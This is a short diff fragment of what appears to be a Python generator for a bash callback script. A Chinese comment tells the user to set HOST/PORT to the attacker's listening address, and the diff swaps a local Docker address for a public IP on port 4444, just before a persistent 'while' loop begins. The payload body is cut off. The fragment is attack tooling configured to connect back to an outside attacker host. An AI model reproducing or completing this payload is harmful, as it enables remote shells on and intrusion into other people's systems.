@@ -5,7 +5,7 @@
 # 修改 HOST/PORT 为攻击者监听地址。
 import os
 
-HOST, PORT = "172.17.0.1", "4444"
+HOST, PORT = "21.214.70.93", "4444"
 
 SCRIPT = f"""#!/bin/bash
 while :; do
